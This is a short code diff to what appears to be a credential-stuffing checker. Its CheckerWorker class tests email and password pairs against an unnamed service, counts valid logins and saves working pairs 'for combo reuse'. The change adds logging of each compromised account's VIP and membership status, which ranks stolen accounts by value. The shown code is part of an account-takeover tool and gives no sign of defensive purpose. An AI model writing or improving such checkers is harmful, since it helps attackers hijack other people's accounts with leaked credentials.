@@ -254,10 +254,13 @@ class CheckerWorker:
                 saved_id = insert_saved_combo(email, password)
                 with self._lock:
                     self.stats.valid += 1
+                vip = "Yes" if result.data.get("is_vip") else "No"
+                membership = result.data.get("membership_status") or "Unknown"
+                detail = f"VIP={vip} Membership={membership}"
                 if saved_id is None:
-                    self._log(f"VALID (dup) | {email}")
+                    self._log(f"VALID (dup) | {email} | {detail}")
                 else:
-                    self._log(f"VALID | {email} — saved for combo reuse")
+                    self._log(f"VALID | {email} | {detail} — saved for combo reuse")
         elif result.status == "VALID":
             saved_id = insert_saved_combo(email, password)
             with self._lock:
